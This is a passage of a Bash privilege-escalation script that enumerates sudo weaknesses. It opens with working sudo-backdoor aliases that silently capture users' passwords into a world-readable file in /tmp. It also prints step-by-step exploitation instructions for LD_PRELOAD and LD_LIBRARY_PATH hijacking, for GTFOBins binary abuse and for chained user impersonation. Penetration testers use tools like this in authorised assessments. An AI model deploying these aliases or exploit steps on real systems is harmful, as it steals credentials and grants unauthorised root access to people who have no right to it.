-r password && echo \"$password\" >/tmp/su && /usr/bin/sudo $@'\n\n## Working\n#[v1] alias sudo='echo -n \"[sudo] password for $USER: \" && echo -e \"\\n\" && read -s -r password && echo \"$USER:$password\" >>/tmp/sk-crds.log; chmod 777 /tmp/sk-crds.log && $(which sudo) $@'\n#[v2] alias sudo='echo -n \"Password: \" && echo -e \"\\n\" && read -s -r password && echo \"$USER:$password\" >>/tmp/sk-crds.log; chmod 777 /tmp/sk-crds.log && $(which sudo) $@'\n\nfn_cred_harvest() {\n  # offline mode check\n  if [ \"$import\" ]; then\n    echo -e \"${BOLD}${GREEN}[/] This check is excluded in the offline mode for now. ${RESET}\"\n\n  else\n    :\n\n    echo \"Current User: $current_user\"\n    current_user=\"$(whoami)\"\n    #echo $current_user\n\n    hdir=$(echo \"\" | ls -al /home/$current_user/.bashrc)\n    wo=${hdir:2:1}\n    wg=${hdir:5:1}\n    wa=${hdir:8:1}\n\n    if [ \"$wo\" == \"w\" ]; then\n      echo \"Current user is the owner and can write to the bashrc file\"\n      echo -e \"${BOLD}${RED}[+] Vulnerable to sudo backdooring (Creds Capture). ${RESET}\"\n      echo \"[*] Exploit, run the following script to backdoor sudo and start harvesting credentials\"\n      echo \"for current user > res/SK-credHarvest2.sh cuser <new|old> ; source /home/<current_user>/.bashrc\"\n      echo -e \"new: [sudo] password for user:\"\n      echo -e \"old: Password:\"\n      echo -e \"TO STOP: run the same script again with same argument\"\n      echo -e \"\\n\"\n      echo -e \"for all users [need root priv] > res/SK-credHarvest2.sh auser <new|old>\"\n      echo -e \"the log /tmp/sk.hvest.log will contains the credentials\"\n\n    fi\n\n    if [ \"$wa\" == \"w\" ]; then\n      echo \"Any user can write to the current user bashrc file\"\n      echo -e \"${BOLD}${RED}[+] Vulnerable to sudo backdooring (Creds Capture). ${RESET}\"\n      echo \"[*] Exploit, run the following script to backdoor sudo and start harvesting credentials\"\n      echo \"for current user > res/SK-credHarvest2.sh cuser <new|old> ; source /home/<current_user>/.bashrc\"\n      echo -e \"new: [sudo] password for user:\"\n      echo -e \"old: Password:\"\n      echo \"TO STOP: run the same script again with same argument\"\n      echo -e \"\\n\"\n      echo \"for all users [need root priv] > res/SK-credHarvest2.sh auser\"\n      echo \"the log /tmp/sk.hvest.log will contains the credentials\"\n\n    #echo \"[*] Exploit, refer to the exploit res/credHarvest.sh\"\n    fi\n\n  #hdir=`echo \"\" | ls -ld /home/*`\n  #echo \"$hdir\"\n  #hdir=`echo \"\" | ls -al /home/*/.bashrc`\n  #echo \"$hdir\"\n\n  # while read -r line; do\n\n  # current=$line\n  # wo=${current:2:1}\n  # wg=${current:5:1}\n  # wa=${current:8:1}\n\n  # dir_user=$( echo \"$current\" | cut -d \" \" -f 3 )\n  # #echo $dir_user\n\n  # if [ \"$current_user\" == \"$dir_user\" ]\n  # then\n  # #echo $wo\n  # #echo $wa\n\n  # if [ \"$wo\" == \"w\" ]\n  # then\n  # # echo \"Current user is the owner and can write the bashrc file\"\n  # echo -e \"${BOLD}${RED}[+] Vulnerable to Creds Harvesting. ${RESET}\"\n  # echo \"[*] Exploit, refer to the exploit res/credHarvest.sh\"\n  # fi\n\n  # if [ \"$wa\" == \"w\" ]\n  # then\n  # # echo \"Current user can write the bashrc file\"\n  # echo -e \"${BOLD}${RED}[+] Vulnerable to Creds Harvesting. ${RESET}\"\n  # echo \"[*] Exploit, refer to the exploit res/credHarvest.sh\"\n  # fi\n\n  # # echo $line\n  # fi # check owner\n  # done <<< \"$hdir\"\n\n  # echo -e \"\\n\"\n\n  #rm /tmp/sh_list1.txt\n\n  fi # offline mode check\n}\n\ncheckcredharvest() {\n\n  echo -e \"${BOLD}${YELLOW}[16/21] ====== Checking for backdooring sudo (Credentials Capture) ====== ${RESET} \\n\"\n  fn_cred_harvest\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [16/21] Completed!${RESET} \\n\"\n\n}\n\n#------------------------------------------------------\n\nfunction fn_dngbin3() {\n  local binary=\"$1\"\n  local user_type=\"$2\"\n  local user=\"$3\"\n  local pwd_req=\"$4\"\n  local bin_path=\"$5\"\n  local ex_path=\"$PWD/dbins/$binary.txt\"\n\n  username=$(echo $user | sed 's/\\/n/xx/g')\n  #fusername=$(echo \"$username\" | tr ' ' ' or ')\n  #username=$(echo -e \"$user\" | sed 's/\\\\n/ or /g')\n\n  bin_path2=$(which \"$binary\")\n\n  if [ -z \"$bin_path2\" ]; then\n    bin_path2=$binary\n  fi\n\n  if [ -z \"$username\" ]; then\n    username=\"Any_non_root_user\"\n  fi\n\n  if [ -f \"$ex_path\" ]; then\n    echo -e \"[+] It is possible to ${BOLD}${RED}impersonate user: $username ${RESET}\"\n    echo -e \"[+] $username's ${BOLD}${RED}password required: $pwd_req${RESET} \"\n    echo -e \"[+] The binary ${BOLD}${RED}$binary${RESET} can be abused for the impersonation\"\n    echo -e \"[+] Run the command: sudo -u \"$username\" $bin_path2 [<cmd>]\"\n    echo -e \"[*] Where <cmd> is as below:\"\n    resgrep=$(echo '' | cat $PWD/dbins/\"$binary\".txt | grep -v \"\\* Sudo \\*\")\n    echo -e \"$resgrep \\n\"\n    echo -e \"-----------------------------------------------------------------------------------\"\n  fi\n}\n\ncheckdangbin() {\n\n  #  # only root user (user password required)\n  #  sudo -l | grep -v \"\\!root\" | grep -i root | grep -v NOPASSWD | sed 's/,/\\n/g' | grep -i bin | cut -d / -f 2- | cut -d \" \" -f 1 | sort -u | sed 's#.*/##'\n\n  #  # only root user with NOPASSWD\n  # sudo -l |  grep -v \"\\!root\" | grep -i root | grep -i NOPASSWD | sed 's/,/\\n/g' | grep -i bin | cut -d / -f 2- | cut -d \" \" -f 1 | sort -u | sed 's#.*/##'\n\n  #  # only non-root user with NOPASSWD\n  # sudo -l |  grep -v \"(root\" | grep -i NOPASSWD | sed 's/,/\\n/g' | grep -i bin | cut -d / -f 2- | cut -d \" \" -f 1 | sort -u | sed 's#.*/##'\n\n  #  # only non-root user (user password required)\n  # sudo -l | grep -v \"(root\" | grep -v NOPASSWD |  sed 's/,/\\n/g' | grep -i bin | cut -d / -f 2- | cut -d \" \" -f 1 | sort -u | sed 's#.*/##'\n\n  echo -e \"${BOLD}${YELLOW}[18/21] ====== Checking for Dangerous binaries (gtfobins) ====== ${RESET} \\n\"\n  echo -e \"[-] dangerous bins (https://gtfobins.github.io/#+sudo): \\n\"\n\n  sysbin_root_no_pwd=$(sudo -l | grep -v \"\\!root\" | grep -i root | grep -i NOPASSWD | sed 's/,/\\n/g' | grep -i bin | cut -d / -f 2- | cut -d \" \" -f 1 | sort -u | sed 's#.*/##' 2>/dev/null)\n  if [ -z \"$sysbin_root_no_pwd\" ]; then\n    echo \"[-] Error: Unable to retrieve sudo permissions. Make sure you have sudo privileges.\"\n    exit 1\n  fi\n  sysbin_root_req_pwd=$(sudo -l | grep -v \"\\!root\" | grep -i root | grep -v NOPASSWD | sed 's/,/\\n/g' | grep -i bin | cut -d / -f 2- | cut -d \" \" -f 1 | sort -u | sed 's#.*/##' 2>/dev/null)\n\n  sysbin_user_no_pwd=$(sudo -l | grep -v \"(root\" | grep -i NOPASSWD | sed 's/,/\\n/g' | grep -i bin | cut -d / -f 2- | cut -d \" \" -f 1 | sort -u | sed 's#.*/##' 2>/dev/null)\n  sysbin_user_req_pwd=$(sudo -l | grep -v \"(root\" | grep -v NOPASSWD | sed 's/,/\\n/g' | grep -i bin | cut -d / -f 2- | cut -d \" \" -f 1 | sort -u | sed 's#.*/##' 2>/dev/null)\n\n  # Read content of text file for each binary\n  for binary in $sysbin_root_no_pwd; do\n    pth1=$(echo \"$cmd\" 2>/dev/null | grep \") NOPASSWD\" | grep \"root\" | grep -w \"bin/$binary\" | cut -d \")\" -f 2 | cut -d \" \" -f 2 | sort -u)\n    fn_dngbin3 \"$(basename \"$binary\")\" \"root\" \"root\" \"No\" \"$pth1\"\n  done\n\n  # Read content of text file for each binary\n  for binary in $sysbin_root_req_pwd; do\n    pth2=$(echo \"$cmd\" 2>/dev/null | grep -v \"NOPASSWD\" | grep \"root\" | grep -w \"bin/$binary\" | cut -d \")\" -f 2 | cut -d \" \" -f 2 | sort -u)\n    fn_dngbin3 \"$(basename \"$binary\")\" \"root\" \"root\" \"Yes\" \"$pth2\"\n  done\n\n  # Read content of text file for each binary\n  for binary in $sysbin_user_no_pwd; do\n    usr3=$(echo \"$cmd\" 2>/dev/null | grep \") NOPASSWD:\" | grep -v \"root\" | grep -w \"bin/$binary\" | cut -d \")\" -f 1 | sed 's/[()]//g' | sed 's/ //g')\n    pth3=$(echo \"$cmd\" 2>/dev/null | grep \") NOPASSWD\" | grep -v \"root\" | grep -w \"bin/$binary\" | cut -d \")\" -f 2 | cut -d \" \" -f 2 | sort -u)\n    fn_dngbin3 \"$(basename \"$binary\")\" \"non-root\" \"$usr3\" \"No\" \"$pth3\"\n  done\n\n  # Read content of text file for each binary\n  for binary in $sysbin_user_req_pwd; do\n    usr4=$(echo \"$cmd\" 2>/dev/null | grep -v \"NOPASSWD:\" | grep -v \"root\" | grep -w \"bin/$binary\" | cut -d \")\" -f 1 | sed 's/[()]//g' | sed 's/ //g')\n    pth4=$(echo \"$cmd\" 2>/dev/null | grep -v \"NOPASSWD\" | grep -v \"root\" | grep -w \"bin/$binary\" | cut -d \")\" -f 2 | cut -d \" \" -f 2 | sort -u)\n    fn_dngbin3 \"$(basename \"$binary\")\" \"non-root\" \"$usr4\" \"Yes\" \"$pth4\"\n  done\n\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [18/21] Completed!${RESET} \\n\"\n\n} # checkdangbin\n\n#------------------------------------------------------\n\nfn_dang_envar() {\n\n  # check for env_reset being disabled\n  sudoenv=$(echo \"$cmd\" 2>/dev/null | grep \"\\!env\\_reset\")\n  if [ \"$sudoenv\" ]; then\n    #sudover1=`echo \"$sudover\" | sed 's/Sudo version //g'`\n    #if [ \"$sudover1\" ]; then\n    #versionToInt $sudover1\n\n    #if [ \"$cnver\" -lt \"1008025\" ] ; then\n    if [ \"$cnver\" -lt \"1008005\" ] && [ \"$cnver\" -gt \"1006009\" ]; then\n      echo -e \"${BOLD}${GREEN}[+] env_reset being disabled, This means we can manipulate the environment of the command we are allowed to run (depending on sudo version).${RESET}\"\n      echo -e \"${BOLD}${RED}[+] Since the sudo version is > 1.6.9 and < 1.8.5, the environment variables are not removed and it is probably vulnerable to the CVE-2014-0106 ${RESET}\"\n      echo -e \"[-] Exploit for the CVE:  CVE/CVE-2014-0106.txt \\n\"\n    fi\n  fi\n\n  sudoenvkeep=$(echo \"$cmd\" 2>/dev/null | grep -i env_keep | sed 's/,/\\n/g' | grep -i env_keep | cut -d \"=\" -f 2 | sed 's/\"//g' | sed 's/ /, /g' | sed 'N;s/\\n/,/')\n  if [ \"$sudoenvkeep\" ]; then\n     echo -e \"${BOLD}${GREEN}[+] This is a list of environment variables that are preserved. They can potentially be abused. ${RESET}\"\n     echo -e \"[-] $sudoenvkeep \\n\"\n  fi\n\n #echo -e \"\\n\"\n\n  # check for LD_PRELOAD\n  sudoenvld_preload=$(echo \"$cmd\" 2>/dev/null | grep \"LD_PRELOAD\")\n  if [ \"$sudoenvld_preload\" ]; then\n    echo -e \"${BOLD}${RED}[+] LD_PRELOAD is set and is a dangerous environment variable.${RESET}\"\n    echo -e \"[-] Notes on the exploitation of LD_PRELOAD : notes/env_exploit.txt\"\n    echo -e \"[-] Exploit :\"\n    echo -e \"     Step 1: cp res/Env_exploit.so /tmp/\"\n    echo -e \"     Step 2: sudo LD_PRELOAD=/tmp/Env_exploit.so [a bin that can be executed with sudo such as ping/cp/find] \\n\"\n  fi\n\n  # check for LD_LIBRARY_PATH\n  #varAp=$(echo \"$cmd\" 2>/dev/null | grep \"/usr/sbin/apache2\" )\n  #if [ \"$varAp\" ]; then\n\n  sudoenvld_lib_path=$(echo \"$cmd\" 2>/dev/null | grep \"LD_LIBRARY_PATH\")\n  if [ \"$sudoenvld_lib_path\" ]; then\n    echo -e \"${BOLD}${RED}[+] LD_LIBRARY_PATH is set and is a dangerous environment variable.${RESET}\"\n    echo -e \"[-] Notes on the exploitation of LD_LIBRARY_PATH : /notes/env_exploit.txt\"\n    echo -e \"[-] Exploit :\"\n    echo -e \"     Step 1 : Identify shared library with cmd > ldd <binary> \"\n    echo -e \"     \texample: ldd /usr/sbin/apache2 \"\n    echo -e \"     Step 2: cp res/Env_exploit2.so /tmp/libcrypt.so.1\"\n    echo -e \"     OR\"\n    echo -e \"     Step 2: compile lib with cmd > gcc  -o /tmp/<shared_Lib> -shared -fPIC  res/ld_library.c \"\n    echo -e \"     \texample: gcc -o /tmp/libcrypt.so.1 -shared -fPIC exploits/ld_library.c \"\n    echo -e \"     Step 3: sudo LD_LIBRARY_PATH=/tmp/ <binary> \"\n    echo -e \"     \texample: sudo LD_LIBRARY_PATH=/tmp/ apache2\\n\"\n\n  else\n    :\n  fi\n\n  #fi\n   #echo -e \"\\n\"\n\n  echo -e \"${BOLD}${GREEN}[+] Checking for dangerous environment variables such as PS4, PERL5OPT, PYTHONINSPECT,... .${RESET}\"\n\n  #>> use res/Dangerous_env_var.txt\n\n  cat $PWD/res/Dangerous_env_var.txt | while read linen1; do\n    sudoenvvar=$(echo \"$cmd\" 2>/dev/null | grep \"$linen1\")\n    if [ \"$sudoenvvar\" ]; then\n      echo \"The dangerous environment variable $linen1 is set within sudo and is potentially vulnerable.\"\n    fi\n  done\n\n  echo -e \"\\n\"\n\n}\n\ncheckdangenvar() {\n  echo -e \"${BOLD}${YELLOW}[17/21] ====== Checking for Dangerous Environment Variables ====== ${RESET} \\n\"\n  fn_dang_envar\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [17/21] Completed!${RESET} \\n\"\n\n} # checkdangenvar\n\n#------------------------------------------------------\nfn_recur_impersonate() {\n  # # Intial - Get a list of potential users that can be impersonated from initial user sudo's rules\n  # #user=`sudo -l | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | awk '{print $NF}' | sed 's/\\*//g' | sort -u`\n  # user=`sudo -l | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | awk '{print $NF}' | sed 's/\\*/\\/*/g' | sort -u`\n\n  # # Clean\n  # echo \"\" > impuser.txt\n\n  # if [ \"$user\" ]; then\n\n  #     echo -e \"--------------------------------\"\n  #     echo -e \"   ${BOLD}${YELLOW}LEVEL 1${RESET} : From $USER  ${BOLD}${BLUE}[1 jump]${RESET}\"\n  #     echo -e \"--------------------------------\"\n\n  #     # check all the users gathered from sudo against /etc/passwd since wildcard could have been used.\n  #     echo \"$user\" | while IFS= read -r line;\n  #     do\n  #         #to decomment - just for lab test since using number in username to track easier\n  #         #cat /etc/passwd | cut -d: -f 1 | grep -iw \"$line\" >> impuser.txt\n  #         #imusr=`cat /etc/passwd | cut -d: -f 1 | grep -iw \"$line\\$\"`\n  #         imusr=`cat /etc/passwd | cut -d: -f 1 | grep -i \"$line\"`\n  #         #echo $line\n  #         if [ \"$imusr\" ]; then\n  #         echo $imusr >> impuser.txt\n  #         echo -e \"${BOLD}${RED}[+] \"$USER\" -> \"$imusr\" ${RESET} \"\n  #         sudo -l 2>/dev/null| grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | grep -i $line\n  #         echo -e \"\\n\"\n  #         fi\n  #     done\n\n  #        echo \"\" > impuser1.txt\n\n  #     if [ -f \"$PWD/impuser.txt\" ]; then\n\n  #            echo -e \"--------------------------------\"\n  #            echo -e \"   ${BOLD}${YELLOW}LEVEL 2${RESET} : ${BOLD}${BLUE}[2 jumps]${RESET}\"\n  #            echo -e \"--------------------------------\"\n\n  #         # Check level 1 - Impersonation\n\n  #             cat $PWD/impuser.txt | sort -u | while read line1\n  #             do\n\n  #                # user=`sudo -l | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | awk '{print $NF}' | sed 's/\\*/\\/*/g' | sort -u`\n  #               # user1=`sudo /bin/su $line1 -c \"export PATH=\"/usr/local/bin:$PATH\"; sudo -l | grep \"NOPASSWD:\" | grep -iw \"/\\*bin/su \\*\" | grep -v \"su root\" | grep -v \"/\\*bin/su \\-\\$\\|/\\*bin/su \\*\\$\\|/\\*bin/su \\- \\*\\$\" | awk '{print $NF}'\"`\n  #                 sdr1=`sudo /bin/su \"$line1\" 2>/dev/null -c \"export PATH=\"/usr/local/bin:$PATH\"; sudo -l 2>/dev/null\"`\n  #                 if [ \"$sdr1\" ]; then\n\n  #                 #$echo \"$sdr1\"\n  #                 #user1=`echo \"$sdr1\" | grep \"NOPASSWD:\"| grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | sed 's/\\*/\\/*/g' | grep -v root | sort -u | awk '{print $NF}' | sed '/^[[:space:]]*$/d'`\n  #                  user1=`echo \"$sdr1\" | grep \"NOPASSWD:\"| grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | sed 's/*/\\/*/g' |  awk '{print $NF}'`\n  #                     #echo \"$user1\"\n  #                     echo \"$user1\" | while IFS= read -r line2;\n  #                         do\n  #                           if [ \"$line2\" ]; then\n  #                             #imusr=`cat /etc/passwd | cut -d: -f 1 | grep -iw \"$line\\$\"`\n  #                             imusr1=`cat /etc/passwd | cut -d: -f 1 | grep -i \"$line2\" 2>/dev/null`\n  #                             #echo $line\n  #                             if [ \"$imusr1\" ]; then\n  #                             echo \"$line1,$imusr1\" >> impuser1.txt\n  #                             echo -e \"${BOLD}${RED}[+] \"$USER\" -> \"$line1\" -> \"$imusr1\" ${RESET}\"\n  #                             sr1=`echo \"$sdr1\" | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | grep -i $line2`\n  #                             echo \"$sr1\"\n  #                             echo -e \"\\n\"\n  #                             fi\n  #                          fi\n  #                         done\n\n  #                 fi\n\n  #             done\n\n  #     fi\n\n  #         if [ -f \"$PWD/impuser1.txt\" ]; then\n\n  #            echo -e \"--------------------------------\"\n  #            echo -e \"   ${BOLD}${YELLOW}LEVEL 3${RESET} : ${BOLD}${BLUE}[3 jumps]${RESET}\"\n  #            echo -e \"--------------------------------\"\n\n  #             # Check level 1 - Impersonation\n\n  #             cat $PWD/impuser1.txt | sort -u | while read line3\n  #             do\n\n  #                 prlvl=`echo $line3 | cut -d\",\" -f1`\n  #                 crlvl=`echo $line3 | cut -d\",\" -f2`\n  #                # user=`sudo -l | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | awk '{print $NF}' | sed 's/\\*/\\/*/g' | sort -u`\n  #               # user1=`sudo /bin/su $line1 -c \"export PATH=\"/usr/local/bin:$PATH\"; sudo -l | grep \"NOPASSWD:\" | grep -iw \"/\\*bin/su \\*\" | grep -v \"su root\" | grep -v \"/\\*bin/su \\-\\$\\|/\\*bin/su \\*\\$\\|/\\*bin/su \\- \\*\\$\" | awk '{print $NF}'\"`\n  #                 sdr1=`sudo /bin/su \"$crlvl\" 2>/dev/null -c \"export PATH=\"/usr/local/bin:$PATH\"; sudo -l 2>/dev/null\"`\n  #                 if [ \"$sdr1\" ]; then\n\n  #                 #$echo \"$sdr1\"\n  #                 #user1=`echo \"$sdr1\" | grep \"NOPASSWD:\"| grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | sed 's/\\*/\\/*/g' | grep -v root | sort -u | awk '{print $NF}' | sed '/^[[:space:]]*$/d'`\n  #                  user1=`echo \"$sdr1\" | grep \"NOPASSWD:\"| grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | sed 's/*/\\/*/g' |  awk '{print $NF}'`\n  #                     #echo \"$user1\"\n  #                     echo \"$user1\" | while IFS= read -r line4;\n  #                         do\n  #                           if [ \"$line4\" ]; then\n  #                             #imusr=`cat /etc/passwd | cut -d: -f 1 | grep -iw \"$line\\$\"`\n  #                             imusr2=`cat /etc/passwd | cut -d: -f 1 | grep -i \"$line4\" 2>/dev/null`\n  #                             #echo $line\n  #                             if [ \"$imusr2\" ]; then\n  #                             echo \"$imusr2\" >> impuser2.txt\n  #                            echo -e \"${BOLD}${RED}[+] \"$USER\" -> \"$prlvl\" -> \"$crlvl\" -> \"$imusr2\" ${RESET} \"\n  #                             sr1=`echo \"$sdr1\" | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | grep -i $line4`\n  #                             echo \"$sr1\"\n  #                             echo -e \"\\n\"\n  #                             fi\n  #                          fi\n  #                         done\n\n  #                 fi\n\n  #             done\n\n  #         fi\n\n  # fi # initial check\n\n  # dddial - Get a list of potential users that can be impersonated from initial user sudo's rules\n  #user=`sudo -l | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | awk '{print $NF}' | sed 's/\\*//g' | sort -u`\n  user=$(sudo -l | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | grep -iv \"\\-c\" | awk '{print $NF}' | sed 's/\\*/\\/*/g' | sort -u)\n\n  # Clean\n  echo \"\" >impuser.txt\n\n  if [ \"$user\" ]; then\n\n    echo -e \"--------------------------------\"\n    echo -e \"   ${BOLD}${YELLOW}LEVEL 1${RESET} : From $USER  ${BOLD}${BLUE}[1 jump]${RESET}\"\n    echo -e \"--------------------------------\"\n\n    # check all the users gathered from sudo against /etc/passwd since wildcard could have been used.\n    echo \"$user\" | while IFS= read -r line; do\n      #to decomment - just for lab test since using number in username to track easier\n      #cat /etc/passwd | cut -d: -f 1 | grep -iw \"$line\" >> impuser.txt\n      #imusr=`cat /etc/passwd | cut -d: -f 1 | grep -iw \"$line\\$\"`\n      imusr=$(cat /etc/passwd | cut -d: -f 1 | grep -ia \"$line\")\n      #echo $line\n      if [ \"$imusr\" ]; then\n        echo $imusr >>impuser.txt\n        echo -e \"${BOLD}${RED}[+] \"$USER\" -> \"$imusr\" ${RESET} \"\n        sudo -l 2>/dev/null | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | grep -iv \"\\-c\" | grep -i $line\n        echo -e \"\\n\"\n      fi\n    done\n\n    echo \"\" >impuser1.txt\n\n    if [ -f \"$PWD/impuser.txt\" ]; then\n\n      echo -e \"--------------------------------\"\n      echo -e \"   ${BOLD}${YELLOW}LEVEL 2${RESET} : ${BOLD}${BLUE}[2 jumps]${RESET}\"\n      echo -e \"--------------------------------\"\n\n      # Check level 1 - Impersonation\n\n      cat $PWD/impuser.txt | sort -u | while read line1; do\n\n        # user=`sudo -l | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | awk '{print $NF}' | sed 's/\\*/\\/*/g' | sort -u`\n        # user1=`sudo /bin/su $line1 -c \"export PATH=\"/usr/local/bin:$PATH\"; sudo -l | grep \"NOPASSWD:\" | grep -iw \"/\\*bin/su \\*\" | grep -v \"su root\" | grep -v \"/\\*bin/su \\-\\$\\|/\\*bin/su \\*\\$\\|/\\*bin/su \\- \\*\\$\" | awk '{print $NF}'\"`\n        sdr1=$(sudo /bin/su \"$line1\" -c \"export PATH=\"/usr/local/bin:$PATH\"; sudo -l 2>/dev/null\" 2>/dev/null)\n        if [ \"$sdr1\" ]; then\n\n          #$echo \"$sdr1\"\n          #user1=`echo \"$sdr1\" | grep \"NOPASSWD:\"| grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | sed 's/\\*/\\/*/g' | grep -v root | sort -u | awk '{print $NF}' | sed '/^[[:space:]]*$/d'`\n          user1=$(echo \"$sdr1\" | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | sed 's/*/\\/*/g' | grep -iv \"\\-c\" | awk '{print $NF}')\n          #echo \"$user1\"\n          echo \"$user1\" | while IFS= read -r line2; do\n            if [ \"$line2\" ]; then\n              #imusr=`cat /etc/passwd | cut -d: -f 1 | grep -iw \"$line\\$\"`\n              imusr1=$(cat /etc/passwd | cut -d: -f 1 | grep -ia \"$line2\" 2>/dev/null)\n              #echo $line\n              if [ \"$imusr1\" ]; then\n                echo \"$line1,$imusr1\" >>impuser1.txt\n                echo -e \"${BOLD}${RED}[+] \"$USER\" -> \"$line1\" -> \"$imusr1\" ${RESET}\"\n                sr1=$(echo \"$sdr1\" | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | grep -iv \"\\-c\" | grep -i $line2)\n                echo \"$sr1\"\n                echo -e \"\\n\"\n              fi\n            fi\n          done\n\n        fi\n\n      done\n\n    fi\n\n    if [ -f \"$PWD/impuser1.txt\" ]; then\n\n      echo -e \"--------------------------------\"\n      echo -e \"   ${BOLD}${YELLOW}LEVEL 3${RESET} : ${BOLD}${BLUE}[3 jumps]${RESET}\"\n      echo -e \"--------------------------------\"\n\n      # Check level 1 - Impersonation\n\n      cat $PWD/impuser1.txt | sort -u | while read line3; do\n\n        prlvl=$(echo $line3 | cut -d\",\" -f1)\n        crlvl=$(echo $line3 | cut -d\",\" -f2)\n        # user=`sudo -l | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | awk '{print $NF}' | sed 's/\\*/\\/*/g' | sort -u`\n        # user1=`sudo /bin/su $line1 -c \"export PATH=\"/usr/local/bin:$PATH\"; sudo -l | grep \"NOPASSWD:\" | grep -iw \"/\\*bin/su \\*\" | grep -v \"su root\" | grep -v \"/\\*bin/su \\-\\$\\|/\\*bin/su \\*\\$\\|/\\*bin/su \\- \\*\\$\" | awk '{print $NF}'\"`\n        sdr1=$(sudo /bin/su \"$crlvl\" -c \"export PATH=\"/usr/local/bin:$PATH\"; sudo -l 2>/dev/null\" 2>/dev/null)\n        if [ \"$sdr1\" ]; then\n\n          #$echo \"$sdr1\"\n          #user1=`echo \"$sdr1\" | grep \"NOPASSWD:\"| grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | sed 's/\\*/\\/*/g' | grep -v root | sort -u | awk '{print $NF}' | sed '/^[[:space:]]*$/d'`\n          user1=$(echo \"$sdr1\" | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | sed 's/*/\\/*/g' | awk '{print $NF}')\n          #echo \"$user1\"\n          echo \"$user1\" | while IFS= read -r line4; do\n            if [ \"$line4\" ]; then\n              #imusr=`cat /etc/passwd | cut -d: -f 1 | grep -iw \"$line\\$\"`\n              imusr2=$(cat /etc/passwd | cut -d: -f 1 | grep -ia \"$line4\" 2>/dev/null)\n              #echo $line\n              if [ \"$imusr2\" ]; then\n                echo \"$imusr2\" >>impuser2.txt\n                echo -e \"${BOLD}${RED}[+] \"$USER\" -> \"$prlvl\" -> \"$crlvl\" -> \"$imusr2\" ${RESET} \"\n                sr1=$(echo \"$sdr1\" | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\" | grep -i $line4)\n                echo \"$sr1\"\n                echo -e \"\\n\"\n              fi\n            fi\n          done\n\n        fi\n\n      done\n\n    fi\n  fi # initial check\n\n    rm impuser.txt\n    rm impuser1.txt\n    rm impuser2.txt\n\n\n}\n\ncheckrecurimper() {\n  echo -e \"${BOLD}${YELLOW}[19/21] ====== Checking for recursive user impersonation (depth:3) ====== ${RESET} \\n\"\n  fn_recur_impersonate\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [19/21] Completed!${RESET} \\n\"\n\n}\n\n#------------------------------------------------------\n\nfind_non_full_path_binaries2() {\n  local line_script=\"$1\"\n\n  sort_line_script=$(echo \"$line_script\" | sort -u)\n\n  